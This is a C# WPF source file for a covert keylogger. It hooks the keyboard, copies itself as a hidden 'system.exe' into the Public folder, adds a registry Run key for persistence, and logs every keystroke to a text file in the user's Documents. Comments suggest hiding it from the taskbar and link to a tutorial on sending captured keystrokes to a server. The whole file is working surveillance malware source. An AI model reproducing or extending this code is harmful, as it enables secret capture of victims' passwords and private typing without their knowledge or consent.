using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Looger_WPF
{
    public partial class MainWindow : Window
    {
        private LowLevelKeyboardListener _listener;
        public static string pathWhereCopy = "C:\\Users\\Public\\";
        const string AppName = "systemLOGGER";

        public MainWindow()
        {
            InitializeComponent();

            _listener = new LowLevelKeyboardListener();
            _listener.OnKeyPressed += _listener_OnKeyPressed;//add executor function on the event
            _listener.HookKeyboard();


            CopyOnPC();

            //додавання програми в автозагрузку
            SetAutorunValue(true);
            //SetAutorunValue(false);

            // untick ShowInTaskBar checkbox in properties
        }

        //копіюванна програми на компютер
        public void CopyOnPC()
        {
            if (!File.Exists(pathWhereCopy + "system.exe"))
            {
                try
                {
                    File.Copy("logger_WPF.exe", pathWhereCopy + "system.exe");
                    File.SetAttributes(pathWhereCopy + "system.exe", FileAttributes.Hidden);
                }
                catch { }
            }
        }//


        //додавання програми в автозагрузку and registry
        public static bool SetAutorunValue(bool autorun)
        {
            string ExePath = Assembly.GetExecutingAssembly().Location;
            //MessageBox.Show(ExePath);

            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");

            try
            {
                if (autorun)
                    reg.SetValue(AppName, ExePath);
                else
                    reg.DeleteValue(AppName);
                // reg.Flush();
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }//

        void _listener_OnKeyPressed(object sender, KeyPressedArgs e)
        {
            this.Logs.Text += e.KeyPressed.ToString();
            SaveLoggs(e.KeyPressed.ToString());
        }

        //getwindowtext c#
        //http://stackoverflow.com/questions/7740379/c-sharp-how-to-use-wm-gettext-getwindowtext-api
        //http://www.pinvoke.net/default.aspx/user32.getwindowtext
        //http://www.cyberforum.ru/csharp-net/thread1035355.html
        //http://www.cyberforum.ru/windows-forms/thread29306.html
        //https://xakep.ru/2006/01/12/29598/

        // Клавиатурный шпион с отправкой данных по сети на сервер.
        // http://procoder.info/index.php/entry/xuki-v-windows/

        public void SaveLoggs(string key)
        {
            File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\Documents\\Logs.txt", Environment.NewLine + key);
            //File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\Documents\\Logs.txt",key);
        }//

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            _listener.UnHookKeyboard();
        }

    }
}
